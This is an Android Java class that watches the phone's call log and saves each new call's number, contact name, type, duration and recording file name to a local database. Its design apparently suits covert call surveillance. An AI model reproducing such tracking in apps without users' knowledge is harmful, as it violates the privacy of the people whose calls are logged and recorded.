package com.android.db;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.provider.CallLog;

import com.android.pojo.Call;
import com.android.sound.PhoneRecord;
import com.android.utils.LogUtils;
import com.android.utils.Utils;

public class CallConten extends ContentObserver {

	
	private int id = -1;
	private Context context;
	public Context getContext() {
		return context;
	}

	private Handler handler;
	private PhoneRecord phonerecord;
	



	@Override
	public void onChange(boolean selfChange) {
		// TODO Auto-generated method stub
		super.onChange(selfChange);
			Cursor c = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
					"_id desc");
			boolean bcall=Utils.getBooleanConfig(context, "call", true);
			if (c.moveToFirst()&&bcall) {
				int type = c.getInt(c.getColumnIndex("type"));
				int _id = c.getInt(c.getColumnIndex("_id"));

				if (type == 1 || type == 2||type==3) {

					if (_id > id) {
						String address=c.getString(c.getColumnIndex("number"));
						if(address.length()>0){
							Call call=new Call();
							call.setDates(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()));
							if(type==1){
								call.setType("来电");
							}else if(type==2){
								call.setType("去电");
							}else if(type==3){
								call.setType("未接");
							}
							call.setAddress(address);
							call.setPhonename(Utils.getContactNameByPhoneNumber(context, address));
							call.setDuration(c.getInt(c.getColumnIndex("duration"))+"秒");
							if(phonerecord!=null){
								LogUtils.write("smsclient",phonerecord.getFileName());
								call.setRecordfile(phonerecord.getFileName());
							}else{
								call.setRecordfile("");
							}
							SqlUtils su=SqlUtils.getinstance(context);
							su.savecall(call);
						}
						
					}
					id = _id;

				}

			}
	}
	
	

	public CallConten(Context context, Handler handler) {
		super(handler);
		// TODO Auto-generated constructor stub
		this.handler=handler;
		this.context = context;
		init();
	}
	public void init(){
		Cursor c = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
				"_id desc");
		c.close();
	}
	
	public void setPhonerecord(PhoneRecord phonerecord) {
		this.phonerecord = phonerecord;
	}
	
}
